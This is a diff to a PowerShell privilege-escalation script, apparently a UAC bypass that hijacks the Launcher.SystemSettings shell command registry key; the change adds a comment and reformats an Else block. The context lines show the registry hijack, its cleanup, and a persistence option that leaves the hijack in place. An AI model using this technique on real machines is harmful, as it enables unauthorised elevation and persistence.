@@ -82,6 +82,7 @@ If($CheckVuln -eq $True){
          Write-Host "[+] Executing Command: '$Command'";Start-Sleep -Milliseconds 700
          Write-Host "[+] Deleting  => EOP registry hacks (revert)";Start-Sleep -Milliseconds 700
       }
+      ## Make sure the vulnerable registry key exists
       $CheckHive = Test-Path -Path "HKCU:\Software\Classes\Launcher.SystemSettings\shell\Open\Command" -ErrorAction SilentlyContinue
       If($CheckHive -eq $True){
          Remove-Item "HKCU:\Software\Classes\Launcher.SystemSettings\shell" -Recurse -Force;Start-Sleep -Seconds 1
@@ -136,7 +137,9 @@ If($CheckVuln -eq $True){
       Remove-Item "HKCU:\Software\Classes\Launcher.SystemSettings\shell" -Recurse -Force;Start-Sleep -Seconds 1
       Remove-Item "HKCU:\Software\Classes\Launcher.SystemSettings\shellex" -Recurse -Force;Start-Sleep -Seconds 1
       Set-ItemProperty -Path "HKCU:\Software\Classes\Launcher.SystemSettings" -Name "(default)" -Value '' -Force
-   }Else{If(-not(Test-Path "$env:TMP\SluiEOP.ps1")){Write-Host "[ ] Executing => MakeItPersistence (True)" -ForeGroundColor yellow;Write-Host "[ ] Hijacking => Registry hacks will NOT be deleted." -ForeGroundColor yellow;Start-Sleep -Seconds 1}}
+   }Else{
+      If(-not(Test-Path "$env:TMP\SluiEOP.ps1")){Write-Host "[ ] Executing => MakeItPersistence (True)" -ForeGroundColor yellow;Write-Host "[ ] Hijacking => Registry hacks will NOT be deleted." -ForeGroundColor yellow;Start-Sleep -Seconds 1}
+   }
 
    <#
    .SYNOPSIS
